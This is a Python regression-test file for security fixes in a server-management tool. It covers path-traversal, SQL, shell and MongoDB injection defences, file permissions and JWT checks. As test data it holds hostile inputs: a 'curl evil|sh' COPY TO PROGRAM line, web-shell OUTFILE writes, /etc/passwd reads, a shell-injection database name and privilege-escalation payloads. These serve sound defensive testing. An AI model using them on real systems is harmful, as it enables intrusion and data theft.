"""
Regression tests for the security fixes V1-V4.

These cover:
  * V1/V2 - safe resource-name validation and directory containment used by the
    services/sites API to block path traversal and arbitrary file writes.
  * V3     - rejection of SQL that escalates to OS command/file access.
  * V4     - shell-argument escaping in the database backup/restore managers.

The validation helpers live in ``wasm.validators.webinput`` precisely so they can
be tested without the optional web stack (fastapi/jose) installed. The manager
tests stub out subprocess execution, so nothing runs against a real system.
"""

import shlex
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from wasm.validators.webinput import (
    is_safe_resource_name,
    is_within_directory,
    query_has_os_escalation,
)
from wasm.core.utils import CommandResult


def _ok(cmd, *args, **kwargs):
    """Fake _run/_run_sudo returning success with a numeric stdout (for stat)."""
    return CommandResult(success=True, stdout="123", stderr="", exit_code=0, command=cmd)


def _captured_bash_c(calls):
    """Extract the `bash -c <script>` payloads from captured command lists."""
    scripts = []
    for cmd in calls:
        if isinstance(cmd, list) and len(cmd) >= 3 and cmd[0] == "bash" and cmd[1] == "-c":
            scripts.append(cmd[2])
    return scripts


class TestSafeResourceName(unittest.TestCase):
    def test_accepts_legitimate_names(self):
        for name in ["myapp", "wasm-example-com", "app.example.com", "app_1", "ENV_VAR-2"]:
            self.assertTrue(is_safe_resource_name(name), name)

    def test_rejects_path_traversal_and_separators(self):
        bad = [
            "../../etc/passwd",
            "foo/bar",
            "foo\\bar",
            "..",
            "a..b",
            "name\x00",
            "",
            "-leadingdash",
            ".hidden",
            "/etc/cron.d/evil",
            "a" * 129,
        ]
        for name in bad:
            self.assertFalse(is_safe_resource_name(name), name)


class TestWithinDirectory(unittest.TestCase):
    def test_contained_paths(self):
        base = "/var/www/sites"
        self.assertTrue(is_within_directory(base, "/var/www/sites/example_com"))
        self.assertTrue(is_within_directory(base, base))  # equal is allowed

    def test_escaping_paths_rejected(self):
        base = "/var/www/sites"
        self.assertFalse(is_within_directory(base, "/var/www/sites/../../../etc/passwd"))
        self.assertFalse(is_within_directory(base, "/etc/passwd"))
        self.assertFalse(is_within_directory(base, "/var/www/sites-other/x"))

    def test_backup_dir_containment(self):
        # V4 (API): restore must stay inside the managed backup directory.
        backup_dir = "/var/backups/wasm/databases"
        self.assertTrue(is_within_directory(backup_dir, "/var/backups/wasm/databases/db.sql.gz"))
        self.assertFalse(is_within_directory(backup_dir, "/tmp/evil.sql.gz"))
        self.assertFalse(
            is_within_directory(backup_dir, "/var/backups/wasm/databases/../../../etc/shadow")
        )


class TestQueryOsEscalation(unittest.TestCase):
    def test_detects_os_escalation(self):
        bad = [
            "COPY t TO PROGRAM 'curl evil|sh'",
            "copy t from program 'x'",
            "SELECT secret INTO OUTFILE '/var/www/shell.php'",
            "SELECT x INTO DUMPFILE '/tmp/x'",
            "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
            "SELECT LOAD_FILE('/etc/passwd')",
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT lo_export(1, '/tmp/x')",
            "SELECT sys_exec('id')",
        ]
        for q in bad:
            self.assertTrue(query_has_os_escalation(q), q)

    def test_allows_ordinary_sql(self):
        ok = [
            "SELECT * FROM users WHERE id = 1",
            "INSERT INTO logs (msg) VALUES ('hello')",
            "UPDATE accounts SET active = true",
            "DROP TABLE temp",
            "CREATE TABLE t (id int)",
            "SELECT program FROM scheduled_jobs",  # 'program' word alone is fine
        ]
        for q in ok:
            self.assertFalse(query_has_os_escalation(q), q)


class TestDatabaseShellEscaping(unittest.TestCase):
    """V4: backup/restore must shell-escape database names and paths."""

    EVIL = "db'; touch /tmp/pwned; '"

    def test_postgres_backup_escapes_database(self):
        from wasm.managers.database.postgres import PostgresManager

        calls = []
        with patch.object(PostgresManager, "_ensure_backup_dir", lambda self: None):
            mgr = PostgresManager(verbose=False)
            mgr._run = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
            mgr._run_sudo = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
            mgr.backup(self.EVIL, output_path=Path("/tmp/out.sql.gz"), compress=True)

        scripts = _captured_bash_c(calls)
        self.assertTrue(scripts, "expected a bash -c invocation")
        joined = "\n".join(scripts)
        # The evil name must appear only in its shlex-quoted form.
        self.assertIn(shlex.quote(self.EVIL), joined)
        self.assertNotIn("; touch /tmp/pwned;", joined.replace(shlex.quote(self.EVIL), ""))

    def test_postgres_restore_escapes_path_and_database(self):
        from wasm.managers.database.postgres import PostgresManager

        with tempfile.NamedTemporaryFile(suffix=".gz") as tmp:
            calls = []
            with patch.object(PostgresManager, "_ensure_backup_dir", lambda self: None), \
                 patch.object(PostgresManager, "database_exists", lambda self, name: True):
                mgr = PostgresManager(verbose=False)
                mgr._run = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
                mgr._run_sudo = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
                mgr.restore(self.EVIL, Path(tmp.name), drop_existing=False)

            scripts = _captured_bash_c(calls)
            self.assertTrue(scripts, "expected a bash -c invocation")
            joined = "\n".join(scripts)
            self.assertIn(shlex.quote(self.EVIL), joined)
            self.assertIn(shlex.quote(tmp.name), joined)

    def test_mysql_backup_escapes_database(self):
        from wasm.managers.database.mysql import MySQLManager

        with tempfile.NamedTemporaryFile(suffix=".sql.gz") as tmp:
            calls = []
            with patch.object(MySQLManager, "_ensure_backup_dir", lambda self: None), \
                 patch.object(MySQLManager, "database_exists", lambda self, name: True):
                mgr = MySQLManager(verbose=False)
                mgr._run_sudo = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
                mgr._run = lambda cmd, *a, **k: (calls.append(cmd), _ok(cmd))[1]
                mgr.backup(self.EVIL, output_path=Path(tmp.name), compress=True)

            scripts = _captured_bash_c(calls)
            self.assertTrue(scripts, "expected a bash -c invocation")
            self.assertIn(shlex.quote(self.EVIL), "\n".join(scripts))


class TestPrivilegeValidation(unittest.TestCase):
    """V6: GRANT/REVOKE privilege lists are validated against an allowlist."""

    def test_accepts_known_privileges(self):
        from wasm.managers.database.postgres import PostgresManager

        self.assertEqual(PostgresManager._safe_privileges(None), "ALL PRIVILEGES")
        self.assertEqual(
            PostgresManager._safe_privileges(["select", "insert", "all privileges"]),
            "SELECT, INSERT, ALL PRIVILEGES",
        )

    def test_rejects_injection_in_privilege_list(self):
        from wasm.managers.database.postgres import PostgresManager
        from wasm.core.exceptions import DatabaseUserError

        for bad in ["SELECT; DROP DATABASE x", "ALL TO attacker", "1=1"]:
            with self.assertRaises(DatabaseUserError):
                PostgresManager._safe_privileges([bad])


class TestPostgresCreateDatabase(unittest.TestCase):
    """V6: encoding is charset-checked and template is escaped as an identifier."""

    def test_rejects_malicious_encoding(self):
        from wasm.managers.database.postgres import PostgresManager
        from wasm.core.exceptions import DatabaseError

        with patch.object(PostgresManager, "_ensure_backup_dir", lambda self: None), \
             patch.object(PostgresManager, "database_exists", lambda self, n: False):
            mgr = PostgresManager(verbose=False)
            with self.assertRaises(DatabaseError):
                mgr.create_database("db", encoding="UTF8'; DROP DATABASE x; --")

    def test_escapes_template_identifier(self):
        from wasm.managers.database.postgres import PostgresManager

        captured = {}

        def fake_exec(self, sql, database=None):
            captured["sql"] = sql
            return True, ""

        with patch.object(PostgresManager, "_ensure_backup_dir", lambda self: None), \
             patch.object(PostgresManager, "database_exists", lambda self, n: False), \
             patch.object(PostgresManager, "_execute_sql", fake_exec), \
             patch.object(PostgresManager, "get_database_info", lambda self, n: None):
            mgr = PostgresManager(verbose=False)
            mgr.create_database("db", template='t"; DROP DATABASE x; --')

        sql = captured["sql"]
        # The template is wrapped/escaped as a quoted identifier, so the ';'
        # cannot terminate the CREATE DATABASE statement.
        self.assertIn('"t""; DROP DATABASE x; --"', sql)


class TestPrivateFile(unittest.TestCase):
    """V7: secrets are written with mode 0600, even over a looser pre-existing file."""

    def test_write_private_file_mode(self):
        import os
        import stat
        from wasm.core.utils import write_private_file

        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "secret"
            p.write_text("old")
            os.chmod(p, 0o644)  # pre-existing world-readable file
            write_private_file(p, "supersecret")
            self.assertEqual(stat.S_IMODE(os.stat(p).st_mode), 0o600)
            self.assertEqual(p.read_text(), "supersecret")


class TestMongoJsEscaping(unittest.TestCase):
    """V9: user/db values are JSON-escaped before going into the mongo JS."""

    def test_create_user_escapes_quotes(self):
        from wasm.managers.database.mongodb import MongoDBManager
        import json

        captured = []
        with patch.object(MongoDBManager, "_ensure_backup_dir", lambda self: None), \
             patch.object(MongoDBManager, "user_exists", lambda self, u, host="localhost": False):
            mgr = MongoDBManager(verbose=False)
            mgr._execute_mongo = lambda cmd, database="admin": (captured.append(cmd), (True, ""))[1]
            evil = "x', pwd:'y', roles:[{role:'root',db:'admin'}]});//"
            mgr.create_user(evil, password="p'q")

        js = captured[0]
        # The username appears only as a JSON-escaped string literal.
        self.assertIn(json.dumps(evil), js)
        # The injected role payload is not present outside the escaped literal.
        self.assertNotIn("roles:[{role:'root'", js.replace(json.dumps(evil), ""))


try:
    import jose  # noqa: F401
    _HAS_JOSE = True
except ImportError:
    _HAS_JOSE = False


@unittest.skipUnless(_HAS_JOSE, "requires python-jose (optional web stack)")
class TestClientIpAndJwt(unittest.TestCase):
    """V5/V8 - run only when the web stack is installed (e.g. CI)."""

    @staticmethod
    def _req(client_host, headers):
        class _Client:
            host = client_host

        class _Req:
            client = _Client()

            def __init__(self, hdrs):
                self.headers = hdrs

        return _Req(headers)

    def test_forwarded_header_ignored_without_trusted_proxy(self):
        from wasm.web.auth import get_client_ip

        req = self._req("10.0.0.1", {"X-Forwarded-For": "6.6.6.6"})
        self.assertEqual(get_client_ip(req), "10.0.0.1")

    def test_forwarded_header_honoured_for_trusted_proxy(self):
        from wasm.web.auth import get_client_ip

        req = self._req("10.0.0.1", {"X-Forwarded-For": "6.6.6.6"})
        self.assertEqual(get_client_ip(req, trusted_proxies=["10.0.0.1"]), "6.6.6.6")

    def test_jwt_rejects_wrong_issuer(self):
        from datetime import datetime, timedelta, timezone

        from jose import jwt as jose_jwt

        from wasm.web.auth import TokenManager, SecurityConfig

        tm = TokenManager(SecurityConfig())
        exp = (datetime.now(timezone.utc) + timedelta(hours=1)).timestamp()
        forged = jose_jwt.encode(
            {"sub": "wasm_session", "sid": "s1", "exp": exp, "iss": "evil"},
            tm._secret_key,
            algorithm="HS256",
        )
        self.assertIsNone(tm.verify_session_token(forged, "1.2.3.4"))


if __name__ == "__main__":
    unittest.main()
